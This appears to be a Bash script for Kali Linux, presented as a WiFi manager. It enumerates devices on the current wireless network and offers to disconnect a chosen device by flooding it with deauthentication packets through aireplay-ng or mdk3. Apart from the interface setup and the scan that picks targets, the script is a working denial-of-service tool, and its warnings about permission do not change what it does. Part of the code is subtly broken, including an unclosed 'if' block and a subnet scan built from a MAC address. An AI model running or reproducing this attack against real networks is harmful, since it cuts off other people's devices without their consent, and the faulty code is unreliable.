#!/bin/bash

# WiFi Network Manager
# A tool for WiFi analysis, device scanning, and targeted device disconnection
# For Kali Linux

# Check if script is run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Dependencies check
dependencies=("airmon-ng" "airodump-ng" "aireplay-ng" "nmap" "macchanger" "iw" "iwconfig" "ip")
missing_deps=0

echo -e "${BLUE}Checking dependencies...${NC}"
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "${RED}$dep is not installed.${NC}"
        missing_deps=1
    fi
done

if [ $missing_deps -eq 1 ]; then
    echo -e "${YELLOW}Please install missing dependencies with:${NC}"
    echo -e "${CYAN}sudo apt-get update && sudo apt-get install aircrack-ng nmap macchanger iw wireless-tools net-tools${NC}"
    exit 1
fi

# Trap ctrl-c and clean up
trap cleanup INT

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    # Reset interface if we put it in monitor mode
    if [ ! -z "$monitor_interface" ]; then
        airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    fi
    # Remove temporary files
    rm -f /tmp/airodump-* 2>/dev/null
    exit 0
}

# Get current interface and wifi information
get_wifi_info() {
    echo -e "${BLUE}Getting current WiFi information...${NC}"
    
    # Try to detect wireless interfaces first
    echo -e "${BLUE}Detecting wireless interfaces...${NC}"
    wifi_interfaces=""
    
    # Try different methods to find wireless interfaces
    if command -v iw &> /dev/null; then
        wifi_interfaces=$(iw dev | grep Interface | awk '{print $2}')
    fi
    
    # If iw didn't work, try iwconfig
    if [ -z "$wifi_interfaces" ] && command -v iwconfig &> /dev/null; then
        wifi_interfaces=$(iwconfig 2>/dev/null | grep -o "^[^ ]*" | grep -v "^$\|lo" | tr '\n' ' ')
    fi
    
    # If we still have no interfaces, try nmcli
    if [ -z "$wifi_interfaces" ] && command -v nmcli &> /dev/null; then
        wifi_interfaces=$(nmcli device status | grep wireless | awk '{print $1}')
    fi
    
    # If we found wifi interfaces, show them
    if [ -n "$wifi_interfaces" ]; then
        echo -e "${GREEN}Found wireless interfaces: $wifi_interfaces${NC}"
        
        # Check if there's only one interface, use it automatically
        if [ $(echo "$wifi_interfaces" | wc -w) -eq 1 ]; then
            current_interface=$wifi_interfaces
            echo -e "${GREEN}Using interface: $current_interface${NC}"
        else
            # Multiple interfaces, let user choose
            echo -e "${YELLOW}Multiple wireless interfaces found. Please select one:${NC}"
            i=1
            declare -A interface_map
            
            for interface in $wifi_interfaces; do
                echo -e "${YELLOW}$i)${NC} $interface"
                interface_map[$i]=$interface
                ((i++))
            done
            
            read -p "Select interface number [1-$((i-1))]: " selection
            
            if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -lt "$i" ]; then
                current_interface=${interface_map[$selection]}
                echo -e "${GREEN}Selected interface: $current_interface${NC}"
            else
                echo -e "${RED}Invalid selection.${NC}"
                read -p "Enter interface name manually (e.g. wlan0): " current_interface
                
                if [ -z "$current_interface" ]; then
                    echo -e "${RED}No interface provided. Exiting.${NC}"
                    exit 1
                fi
            fi
        fi
    else
        # No wireless interfaces found, show all network interfaces
        echo -e "${YELLOW}No wireless interfaces found. Showing all network interfaces...${NC}"
        available_interfaces=$(ip -o link show | awk -F': ' '{print $2}' | grep -v "lo")
        
        if [ -z "$available_interfaces" ]; then
            echo -e "${RED}No network interfaces detected.${NC}"
            echo -e "${YELLOW}For virtual machines, you may need to:${NC}"
            echo -e "  1. Configure your VM to use a bridged network adapter"
            echo -e "  2. Use a compatible USB WiFi adapter passed through to the VM"
            echo -e "  3. On VirtualBox, use 'Intel PRO/1000 MT Desktop' adapter in bridged mode"
            
            # Force user to provide an interface name
            read -p "Enter your WiFi interface name (e.g. wlan0): " current_interface
            
            if [ -z "$current_interface" ]; then
                echo -e "${RED}No interface provided. Exiting.${NC}"
                exit 1
            fi
        else
            # Show available interfaces and let user choose
            i=1
            declare -A interface_map
            
            echo "Available interfaces:"
            while read -r interface; do
                echo -e "${YELLOW}$i)${NC} $interface"
                interface_map[$i]=$interface
                ((i++))
            done <<< "$available_interfaces"
            
            read -p "Select interface number [1-$((i-1))]: " selection
            
            if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -lt "$i" ]; then
                current_interface=${interface_map[$selection]}
                echo -e "${GREEN}Selected interface: $current_interface${NC}"
            else
                echo -e "${RED}Invalid selection.${NC}"
                read -p "Enter interface name manually (e.g. wlan0): " current_interface
                
                if [ -z "$current_interface" ]; then
                    echo -e "${RED}No interface provided. Exiting.${NC}"
                    exit 1
                fi
            fi
        fi
    fi
    
    # Attempt to get interface information using various tools
    
    # Try to get SSID information in different ways
    ssid=""
    
    # Method 1: nmcli
    if command -v nmcli &> /dev/null; then
        ssid=$(nmcli -t -f GENERAL.CONNECTION device show "$current_interface" 2>/dev/null | cut -d':' -f2)
    fi
    
    # Method 2: iwconfig
    if [ -z "$ssid" ] && command -v iwconfig &> /dev/null; then
        ssid=$(iwconfig "$current_interface" 2>/dev/null | grep 'ESSID:' | awk -F '"' '{print $2}')
    fi
    
    # Method 3: iw
    if [ -z "$ssid" ] && command -v iw &> /dev/null; then
        ssid=$(iw "$current_interface" link 2>/dev/null | grep 'SSID:' | awk '{print $2}')
    fi
    
    # If still nothing, mark as not connected
    if [ -z "$ssid" ]; then
        ssid="Not connected"
    fi
    
    # Get MAC address
    mac_address=$(ip link show "$current_interface" 2>/dev/null | grep link/ether | awk '{print $2}')
    if [ -z "$mac_address" ]; then
        mac_address="Unknown"
    fi
    
    # Get signal strength and security
    signal_strength="N/A"
    security="N/A"
    bssid="N/A"
    channel="N/A"
    
    if [ "$ssid" != "Not connected" ]; then
        # Try to get BSSID in different ways
        if command -v nmcli &> /dev/null; then
            bssid=$(nmcli -t -f GENERAL.BSSID device show "$current_interface" 2>/dev/null | cut -d':' -f2- | xargs)
        fi
        
        if [ "$bssid" = "N/A" ] && command -v iwconfig &> /dev/null; then
            bssid=$(iwconfig "$current_interface" 2>/dev/null | grep 'Access Point:' | awk '{print $6}')
        fi
        
        if [ "$bssid" = "N/A" ] && command -v iw &> /dev/null; then
            bssid=$(iw "$current_interface" link 2>/dev/null | grep 'Connected to' | awk '{print $3}')
        fi
        
        # Try to get channel in different ways
        if command -v iwlist &> /dev/null; then
            channel_info=$(iwlist "$current_interface" channel 2>/dev/null | grep Current | sed 's/.*Channel \([0-9]*\).*/\1/')
            if [ -n "$channel_info" ]; then
                channel=$channel_info
            fi
        fi
        
        if [ "$channel" = "N/A" ] && command -v iw &> /dev/null; then
            channel=$(iw "$current_interface" info 2>/dev/null | grep channel | awk '{print $2}')
        fi
        
        # Try to get signal strength in different ways
        if command -v nmcli &> /dev/null; then
            signal_info=$(nmcli -f IN-USE,SIGNAL device wifi 2>/dev/null | grep "*" | awk '{print $2}')
            if [ -n "$signal_info" ]; then
                signal_strength=$signal_info
            fi
        fi
        
        if [ "$signal_strength" = "N/A" ] && command -v iwconfig &> /dev/null; then
            signal_level=$(iwconfig "$current_interface" 2>/dev/null | grep "Signal level" | awk -F= '{print $3}' | awk '{print $1}')
            if [ -n "$signal_level" ]; then
                # Convert dBm to percentage (approximate)
                if [[ $signal_level == *"dBm"* ]]; then
                    signal_dbm=$(echo $signal_level | sed 's/dBm//')
                    # Convert dBm to percentage (rough approximation)
                    signal_strength=$((100 + $signal_dbm / 1))
                    if [ $signal_strength -lt 0 ]; then
                        signal_strength=0
                    elif [ $signal_strength -gt 100 ]; then
                        signal_strength=100
                    fi
                else
                    # Assuming it's already a percentage
                    signal_strength=$signal_level
                fi
            fi
        fi
        
        # Try to get security information
        if command -v nmcli &> /dev/null; then
            security_info=$(nmcli -f SECURITY device wifi 2>/dev/null | grep -A 1 IN-USE | tail -1 | xargs)
            if [ -n "$security_info" ]; then
                security=$security_info
            fi
        fi
    fi
    
    # Display WiFi info
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}        WiFi Information           ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}Interface:${NC} $current_interface"
    echo -e "${CYAN}MAC Address:${NC} $mac_address"
    echo -e "${CYAN}SSID:${NC} $ssid"
    echo -e "${CYAN}BSSID:${NC} $bssid"
    echo -e "${CYAN}Channel:${NC} $channel"
    echo -e "${CYAN}Signal Strength:${NC} $signal_strength%"
    echo -e "${CYAN}Security:${NC} $security"
    echo -e "${GREEN}====================================${NC}"
    
    return 0
}

# Put interface in monitor mode
enable_monitor_mode() {
    echo -e "\n${BLUE}Enabling monitor mode on $current_interface...${NC}"
    
    # Try multiple methods to enable monitor mode
    
    # Method 1: Use airmon-ng (standard method)
    if command -v airmon-ng &> /dev/null; then
        echo -e "${BLUE}Using airmon-ng to enable monitor mode...${NC}"
        
        # Kill processes that might interfere with monitor mode
        airmon-ng check kill > /dev/null 2>&1
        
        # Put interface in monitor mode
        airmon-ng start "$current_interface" > /dev/null 2>&1
        
        # Get the name of the monitor interface (might be different from original)
        monitor_interface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
        
        if [ -z "$monitor_interface" ]; then
            # Try alternative naming convention
            monitor_interface="${current_interface}mon"
            if ! iwconfig "$monitor_interface" &>/dev/null; then
                # If airmon-ng failed, try method 2
                monitor_interface=""
            fi
        fi
    fi
    
    # Method 2: Use iw directly if airmon-ng failed or not available
    if [ -z "$monitor_interface" ] && command -v iw &> /dev/null; then
        echo -e "${BLUE}Using iw to enable monitor mode...${NC}"
        
        # Take down the interface if it's up
        ip link set "$current_interface" down 2>/dev/null
        
        # Try to set monitor mode
        if iw dev "$current_interface" set type monitor 2>/dev/null; then
            # Bring the interface back up
            ip link set "$current_interface" up 2>/dev/null
            
            # Check if monitor mode was enabled
            mode_check=$(iwconfig "$current_interface" 2>/dev/null | grep -i "Mode:Monitor")
            
            if [ -n "$mode_check" ]; then
                monitor_interface="$current_interface"
            fi
        fi
    fi
    
    # Method 3: Use iwconfig directly
    if [ -z "$monitor_interface" ] && command -v iwconfig &> /dev/null; then
        echo -e "${BLUE}Using iwconfig to enable monitor mode...${NC}"
        
        # Take down the interface
        ifconfig "$current_interface" down 2>/dev/null
        
        # Try to set monitor mode with iwconfig
        if iwconfig "$current_interface" mode monitor 2>/dev/null; then
            # Bring the interface back up
            ifconfig "$current_interface" up 2>/dev/null
            
            # Check if monitor mode was enabled
            mode_check=$(iwconfig "$current_interface" 2>/dev/null | grep -i "Mode:Monitor")
            
            if [ -n "$mode_check" ]; then
                monitor_interface="$current_interface"
            fi
        fi
    fi
    
    # If all methods failed
    if [ -z "$monitor_interface" ]; then
        echo -e "${RED}Failed to enable monitor mode on $current_interface.${NC}"
        echo -e "${YELLOW}This could be because:${NC}"
        echo -e "  1. Your network adapter doesn't support monitor mode"
        echo -e "  2. You're running in a virtual machine without proper USB passthrough"
        echo -e "  3. The required drivers are not installed correctly"
        
        read -p "Would you like to continue with network scanning using alternative methods? (y/n): " -n 1 -r
        echo
        
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            echo -e "${RED}Exiting.${NC}"
            exit 1
        else
            echo -e "${YELLOW}Using alternative scanning methods (may be less effective)...${NC}"
            # We'll use the current interface in managed mode
            monitor_interface="$current_interface"
        fi
    else
        echo -e "${GREEN}Monitor mode enabled on $monitor_interface${NC}"
    fi
    
    return 0
}

# Scan for connected devices
scan_devices() {
    if [ "$ssid" == "Not connected" ]; then
        echo -e "${RED}Not connected to any network. Cannot scan devices.${NC}"
        return 1
    fi
    
    echo -e "\n${BLUE}Scanning for connected devices on $ssid...${NC}"
    echo -e "${YELLOW}This will temporarily enable monitor mode (if your adapter supports it).${NC}"
    read -p "Continue (y/n)? " -n 1 -r
    echo
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        return 1
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    # Create temporary files for scan results
    temp_file="/tmp/airodump-scan"
    
    # Determine the scanning method to use
    if command -v airodump-ng &> /dev/null && [ "$monitor_interface" != "$current_interface" ]; then
        # Use airodump-ng if we successfully enabled monitor mode
        echo -e "${BLUE}Scanning network traffic for 15 seconds...${NC}"
        echo -e "${YELLOW}Press Ctrl+C to stop scanning early${NC}"
        
        # Start airodump to collect data
        # Only specify channel and bssid if we have them
        airodump_cmd="airodump-ng"
        
        if [ "$channel" != "N/A" ]; then
            airodump_cmd="$airodump_cmd -c $channel"
        fi
        
        if [ "$bssid" != "N/A" ]; then
            airodump_cmd="$airodump_cmd --bssid $bssid"
        fi
        
        airodump_cmd="$airodump_cmd -w $temp_file $monitor_interface > /dev/null 2>&1"
        
        # Start the scan
        eval $airodump_cmd &
        airodump_pid=$!
        
        # Show a spinner while scanning
        spin='-\|/'
        i=0
        end=$((SECONDS+15))
        
        while [ $SECONDS -lt $end ]; do
            i=$(( (i+1) % 4 ))
            printf "\r${BLUE}Scanning: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
            sleep .5
        done
        
        # Kill airodump
        kill $airodump_pid 2>/dev/null
        wait $airodump_pid 2>/dev/null
        
        # Reset interface back to managed mode if we changed it
        if [ "$monitor_interface" != "$current_interface" ]; then
            echo -e "\n${BLUE}Resetting interface back to managed mode...${NC}"
            airmon-ng stop "$monitor_interface" > /dev/null 2>&1 || true
            
            # If airmon-ng fails, try iw
            if command -v iw &> /dev/null; then
                iw dev "$monitor_interface" del 2>/dev/null || true
            fi
            
            # Restart network services
            service NetworkManager restart > /dev/null 2>&1 || true
            
            # Wait for network to reconnect
            echo -e "${BLUE}Waiting for network to reconnect...${NC}"
            sleep 3
        fi
        
        # Parse the CSV file to get client information
        csv_file="${temp_file}-01.csv"
        
        if [ ! -f "$csv_file" ]; then
            echo -e "${RED}Scan results not found. Trying alternative methods...${NC}"
            use_alternative=1
        else
            # Extract client information from CSV
            # Skip header lines and get the client section
            clients=$(awk -F, 'NR>5 {print $1","$6}' "$csv_file" | grep -v "Station MAC")
            
            if [ -z "$clients" ]; then
                echo -e "${RED}No clients found connected to this network. Trying alternative methods...${NC}"
                use_alternative=1
            else
                use_alternative=0
            fi
        fi
    else
        # Use alternative methods if airodump-ng is not available or monitor mode failed
        echo -e "${YELLOW}Using alternative scanning methods...${NC}"
        use_alternative=1
    fi
    
    # Alternative scanning methods if airodump-ng didn't work
    if [ "$use_alternative" -eq 1 ]; then
        # Method 1: Use ARP scan with nmap
        if command -v nmap &> /dev/null; then
            echo -e "${BLUE}Performing ARP scan with nmap...${NC}"
            arp_scan_result=$(nmap -sn -PR "${bssid}/24" 2>/dev/null)
            
            # Extract MAC addresses from nmap scan
            mac_addresses=$(echo "$arp_scan_result" | grep -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | sed -E 's/.*([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}).*/\0/g')
            
            if [ -z "$mac_addresses" ]; then
                # Try scanning the local subnet instead
                local_ip=$(ip -4 addr show "$current_interface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
                
                if [ -n "$local_ip" ]; then
                    subnet=$(echo "$local_ip" | cut -d. -f1-3)
                    echo -e "${BLUE}Scanning subnet $subnet.0/24...${NC}"
                    
                    arp_scan_result=$(nmap -sn "$subnet.0/24" 2>/dev/null)
                    mac_addresses=$(echo "$arp_scan_result" | grep -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | sed -E 's/.*([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}).*/\0/g')
                fi
            fi
            
            # Convert to CSV-like format for compatibility with the rest of the script
            if [ -n "$mac_addresses" ]; then
                clients=$(echo "$mac_addresses" | while read mac; do echo "$mac,0"; done)
            fi
        fi
        
        # Method 2: Use ARP table directly if nmap didn't find anything
        if [ -z "$clients" ]; then
            echo -e "${BLUE}Querying ARP table...${NC}"
            arp_table=$(arp -an 2>/dev/null)
            
            if [ -n "$arp_table" ]; then
                clients=$(echo "$arp_table" | grep -v "incomplete" | sed -E 's/.*\(([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\).*at ([0-9a-fA-F:]+).*/\2,0/g')
            fi
        fi
        
        # If we still have no clients, try one last method
        if [ -z "$clients" ]; then
            echo -e "${BLUE}Performing ping sweep to populate ARP cache...${NC}"
            
            local_ip=$(ip -4 addr show "$current_interface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
            
            if [ -n "$local_ip" ]; then
                subnet=$(echo "$local_ip" | cut -d. -f1-3)
                
                # Ping the entire subnet to populate ARP cache
                for i in {1..254}; do
                    ping -c 1 -W 1 "$subnet.$i" > /dev/null 2>&1 &
                done
                
                # Wait for pings to finish
                echo -e "${BLUE}Waiting for ping sweep to complete...${NC}"
                wait
                
                # Check ARP table again
                arp_table=$(arp -an 2>/dev/null)
                if [ -n "$arp_table" ]; then
                    clients=$(echo "$arp_table" | grep -v "incomplete" | sed -E 's/.*\(([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\).*at ([0-9a-fA-F:]+).*/\2,0/g')
                fi
            fi
        fi
    fi
    
    # Final check if we found any clients
    if [ -z "$clients" ]; then
        echo -e "${RED}No clients found connected to this network.${NC}"
        return 1
    fi
    
    # Display the clients
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}    Connected Devices on $ssid     ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}MAC Address          Vendor/Device Type${NC}"
    echo -e "${GREEN}------------------------------------${NC}"
    
    declare -A device_list
    count=1
    
    while IFS=, read -r mac_addr power; do
        mac_addr=$(echo "$mac_addr" | xargs)
        
        # Skip the router itself if we have its BSSID
        if [ "$bssid" != "N/A" ] && [ "$mac_addr" = "$bssid" ]; then
            continue
        fi
        
        # Use various methods to identify the device
        vendor=""
        
        # Method 1: Use nmap for vendor identification
        if command -v nmap &> /dev/null; then
            vendor=$(nmap --script broadcast-dhcp-discover -e "$current_interface" 2>/dev/null | grep -i "$mac_addr" -A 3 | grep "Vendor" | cut -d':' -f2 | xargs)
        fi
        
        # Method 2: Use macchanger's OUI database
        if [ -z "$vendor" ] && command -v macchanger &> /dev/null; then
            vendor=$(macchanger -l 2>/dev/null | grep "$(echo $mac_addr | cut -d':' -f1,2,3)" | cut -d' ' -f5- | xargs)
        fi
        
        # Method 3: Identify common device types by MAC prefix
        if [ -z "$vendor" ]; then
            mac_prefix=$(echo $mac_addr | cut -d':' -f1,2,3)
            case "$mac_prefix" in
                "00:0C:29") vendor="VMware Virtual Machine" ;;
                "00:50:56") vendor="VMware Virtual Machine" ;;
                "00:1C:42") vendor="Parallels Virtual Machine" ;;
                "08:00:27") vendor="VirtualBox Virtual Machine" ;;
                "00:1A:11") vendor="Google Device" ;;
                "B8:27:EB") vendor="Raspberry Pi" ;;
                "DC:A6:32") vendor="Raspberry Pi" ;;
                "00:11:22") vendor="Android Device" ;;
                "A4:C6:4F") vendor="Apple Device" ;;
                "00:25:00") vendor="Apple Device" ;;
                "00:17:88") vendor="Philips Hue" ;;
                "EC:FA:BC") vendor="Amazon Echo/Alexa" ;;
                "FC:65:DE") vendor="Amazon Kindle" ;;
                "58:EF:68") vendor="Samsung Smart TV" ;;
                "00:26:B9") vendor="Dell Computer" ;;
                "14:DA:E9") vendor="ASUSTek Computer" ;;
                "00:24:2C") vendor="Netgear Device" ;;
                "00:14:22") vendor="Dell Device" ;;
                "CC:B2:55") vendor="D-Link Device" ;;
                "00:AE:FA") vendor="Microsoft Xbox" ;;
                "58:6D:8F") vendor="Cisco/Linksys Device" ;;
                "00:12:17") vendor="Cisco/Linksys Device" ;;
                *) vendor="Unknown Device" ;;
            esac
        fi
        
        echo -e "${YELLOW}$count)${NC} $mac_addr  $vendor"
        device_list[$count]=$mac_addr
        ((count++))
    done <<< "$clients"
    
    echo -e "${GREEN}====================================${NC}"
    
    # Option to select a device to deauthenticate
    echo -e "\n${BLUE}Would you like to disconnect a device? (y/n)${NC}"
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${BLUE}Enter the number of the device to disconnect:${NC}"
        read device_number
        
        if [ -z "${device_list[$device_number]}" ]; then
            echo -e "${RED}Invalid selection.${NC}"
            return 1
        fi
        
        deauth_device "${device_list[$device_number]}"
    fi
    
    return 0
}

# Disconnect a device from the network
deauth_device() {
    target_mac=$1
    
    echo -e "\n${BLUE}Preparing to disconnect device: $target_mac${NC}"
    echo -e "${RED}Warning: Disconnecting devices from networks you don't own may be illegal.${NC}"
    echo -e "${YELLOW}Use this feature only on networks you own or have permission to test.${NC}"
    echo -e "${BLUE}How many deauthentication packets to send? (10-100, more = longer disconnection)${NC}"
    read packet_count
    
    # Validate input
    if ! [[ "$packet_count" =~ ^[0-9]+$ ]] || [ "$packet_count" -lt 10 ] || [ "$packet_count" -gt 100 ]; then
        echo -e "${RED}Invalid input. Using default of 30 packets.${NC}"
        packet_count=30
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    # Check if BSSID is known
    if [ "$bssid" = "N/A" ]; then
        echo -e "${YELLOW}BSSID (router MAC) is unknown. Attempting to find it...${NC}"
        
        # Try to get BSSID from iwconfig
        if command -v iwconfig &> /dev/null; then
            bssid_check=$(iwconfig "$current_interface" 2>/dev/null | grep "Access Point:" | awk '{print $6}')
            if [ -n "$bssid_check" ] && [ "$bssid_check" != "Not-Associated" ]; then
                bssid=$bssid_check
                echo -e "${GREEN}Found BSSID: $bssid${NC}"
            fi
        fi
        
        # If still unknown, ask the user
        if [ "$bssid" = "N/A" ]; then
            echo -e "${YELLOW}Cannot determine router's MAC address automatically.${NC}"
            read -p "Please enter the router's MAC address (format: XX:XX:XX:XX:XX:XX): " bssid
            
            if [ -z "$bssid" ]; then
                echo -e "${RED}No BSSID provided. Cannot perform deauthentication.${NC}"
                return 1
            fi
        fi
    fi
    
    # Check if we can use aireplay-ng
    if command -v aireplay-ng &> /dev/null && [ "$monitor_interface" != "$current_interface" ]; then
        echo -e "${BLUE}Sending $packet_count deauthentication packets to $target_mac...${NC}"
        echo -e "${YELLOW}This will disconnect the device temporarily.${NC}"
        
        # Send deauth packets
        aireplay-ng -0 "$packet_count" -a "$bssid" -c "$target_mac" "$monitor_interface" > /dev/null 2>&1
        
        echo -e "${GREEN}Deauthentication attack completed.${NC}"
    else
        # If aireplay-ng not available or monitor mode failed, try alternative method
        echo -e "${YELLOW}Cannot use aireplay-ng. Trying MDK3 as alternative...${NC}"
        
        if command -v mdk3 &> /dev/null; then
            # Create temporary blacklist file
            echo "$target_mac" > /tmp/blacklist
            
            # Use MDK3 for deauth attack
            mdk3 "$monitor_interface" d -b /tmp/blacklist -c "$channel" > /dev/null 2>&1 &
            mdk_pid=$!
            
            # Show a spinner while attacking
            spin='-\|/'
            i=0
            end=$((SECONDS+10))
            
            while [ $SECONDS -lt $end ]; do
                i=$(( (i+1) % 4 ))
                printf "\r${BLUE}Deauthenticating: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
                sleep .5
            done
            
            # Kill MDK3
            kill $mdk_pid 2>/dev/null
            wait $mdk_pid 2>/dev/null
            
            # Remove temporary file
            rm -f /tmp/blacklist
            
            echo -e "\n${GREEN}Deauthentication attack completed.${NC}"
        else
            echo -e "${RED}No suitable tool found for deauthentication attack.${NC}"
            echo -e "${YELLOW}Please install aireplay-ng or mdk3:${NC}"
            echo -e "${CYAN}sudo apt-get install aircrack-ng mdk3${NC}"
            return 1
        fi
    fi
    
    # Reset interface back to managed mode if necessary
    if [ "$monitor_interface" != "$current_interface" ]; then
        # Try different methods to reset the interface
        if command -v airmon-ng &> /dev/null; then
            airmon-ng stop "$monitor_interface" > /dev/null 2>&1
        else
            # Manual reset using iw or iwconfig
            if command -v iw &> /dev/null; then
                iw dev "$monitor_interface" del 2>/dev/null || true
            fi
            
            if command -v iwconfig &> /dev/null; then
                iwconfig "$current_interface" mode managed 2>/dev/null || true
            fi
        fi
        
        # Restart network services
        service NetworkManager restart > /dev/null 2>&1 || true

    
    echo -e "${BLUE}Waiting for network to reconnect...${NC}"
    sleep 3
    
    return 0
}

# Main menu
show_menu() {
    echo -e "\n${BLUE}What would you like to do?${NC}"
    echo -e "${YELLOW}1)${NC} Refresh WiFi information"
    echo -e "${YELLOW}2)${NC} Scan for connected devices"
    echo -e "${YELLOW}3)${NC} Exit"
    read -p "Select option [1-3]: " option
    
    case $option in
        1) get_wifi_info ;;
        2) scan_devices ;;
        3) cleanup ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
}

# Main program
clear
echo -e "${GREEN}====================================${NC}"
echo -e "${GREEN}  WiFi Manager for Kali Linux      ${NC}"
echo -e "${GREEN}====================================${NC}"
echo -e "${YELLOW}This tool allows you to analyze WiFi networks, scan connected devices,${NC}"
echo -e "${YELLOW}and selectively disconnect devices from your network.${NC}"
echo -e "${RED}Warning: Use responsibly and only on networks you own or have permission to test.${NC}"
echo -e "${GREEN}====================================${NC}"

# Get initial WiFi information
get_wifi_info

# Main loop
while true; do
    show_menu
done